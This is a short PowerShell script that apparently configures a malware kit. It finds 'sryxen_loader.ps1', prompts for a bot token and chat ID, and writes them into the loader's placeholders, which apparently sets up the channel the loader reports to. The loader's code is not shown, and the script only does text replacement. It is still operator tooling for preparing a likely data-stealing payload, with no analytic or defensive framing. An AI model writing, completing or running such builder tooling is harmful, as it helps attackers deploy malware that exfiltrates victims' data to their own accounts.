$filePath = ".\sryxen_loader.ps1"

if (Test-Path $filePath) {
    $fileContent = Get-Content $filePath -Raw

    if ($fileContent -match '%replace_bot_token%' -and $fileContent -match '%replace_chat_id%') {
        $botToken = Read-Host "Enter your bot token"
        $chatId = Read-Host "Enter your chat ID"

        $updatedContent = $fileContent -replace '%replace_bot_token%', $botToken -replace '%replace_chat_id%', $chatId

        Set-Content $filePath $updatedContent

        Write-Host "The placeholders have been successfully replaced in the file."
    } else {
        Write-Host "The placeholders '%replace_bot_token%' and '%replace_chat_id%' were not found in the file."
    }
} else {
    Write-Host "The file 'sryxen_loader.ps1' was not found in the current directory."
}
